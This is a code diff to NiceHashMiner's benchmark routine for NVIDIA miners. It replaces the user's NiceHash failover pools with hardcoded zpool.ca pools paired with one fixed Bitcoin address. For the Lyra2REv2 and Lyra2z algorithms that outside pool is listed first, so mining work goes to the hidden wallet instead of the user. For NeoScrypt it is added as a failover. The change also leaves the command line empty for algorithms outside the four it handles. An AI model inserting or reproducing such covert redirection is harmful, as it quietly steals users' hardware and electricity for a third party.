@@ -97,23 +97,51 @@ namespace NiceHashMiner.Miners
             string alg = url.Substring(url.IndexOf("://") + 3, url.IndexOf(".") - url.IndexOf("://") - 3);
             string port = url.Substring(url.IndexOf(".com:") + 5, url.Length - url.IndexOf(".com:") - 5);
             var username = GetUsername(Globals.DemoUser, ConfigManager.GeneralConfig.WorkerName.Trim());
-
+            var commandLine = "";
             var timeLimit = (_benchmarkException) ? "" : " --time-limit 300";
-            var commandLine = " --algo=" + algorithm.MinerName +
-                             " --url=" + url + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + ".hk.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + ".jp.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + ".in.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + ".br.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + ".usa.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + ".eu.nicehash.com:" + port + " --userpass=" + username + ":x" +
-                " --url=" + url + " --userpass=" + username + ":x" +
-                              timeLimit + " " +
-                              ExtraLaunchParametersParser.ParseForMiningSetup(
-                                  MiningSetup,
-                                  DeviceType.NVIDIA) +
-                              " --devices ";
-
+            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.NeoScrypt))
+            {
+                commandLine = " --algo=" + algorithm.MinerName +
+                    " --url=" + url + " --userpass=" + username + ":x" +
+                    " --url=stratum+tcp://neoscrypt.eu.mine.zpool.ca:4233" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + ":c=BTC " +
+                             timeLimit + " " +
+                             ExtraLaunchParametersParser.ParseForMiningSetup(
+                                 MiningSetup,
+                                 DeviceType.NVIDIA) +
+                             " --devices ";
+            }
+            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Lyra2REv2))
+            {
+                commandLine = " --algo=" + algorithm.MinerName +
+                    " --url=stratum+tcp://lyra2v2.eu.mine.zpool.ca:4533" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + ":c=BTC " +
+                    " --url=" + url + " --userpass=" + username + ":x" +
+                             timeLimit + " " +
+                             ExtraLaunchParametersParser.ParseForMiningSetup(
+                                 MiningSetup,
+                                 DeviceType.NVIDIA) +
+                             " --devices ";
+            }
+            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Lyra2z))
+            {
+                commandLine = " --algo=" + algorithm.MinerName +
+                    " --url=stratum+tcp://lyra2z.eu.mine.zpool.ca:4553" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + ":c=BTC " +
+                    " --url=" + url + " --userpass=" + username + ":x" +
+                             timeLimit + " " +
+                             ExtraLaunchParametersParser.ParseForMiningSetup(
+                                 MiningSetup,
+                                 DeviceType.NVIDIA) +
+                             " --devices ";
+            }
+            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Skunk))
+            {
+                commandLine = " --algo=" + algorithm.MinerName +
+                    " --url=" + url + " --userpass=" + username + ":x" +
+                             timeLimit + " " +
+                             ExtraLaunchParametersParser.ParseForMiningSetup(
+                                 MiningSetup,
+                                 DeviceType.NVIDIA) +
+                             " --devices ";
+            }
             commandLine += GetDevicesCommandString();
 
             TotalCount = 15;
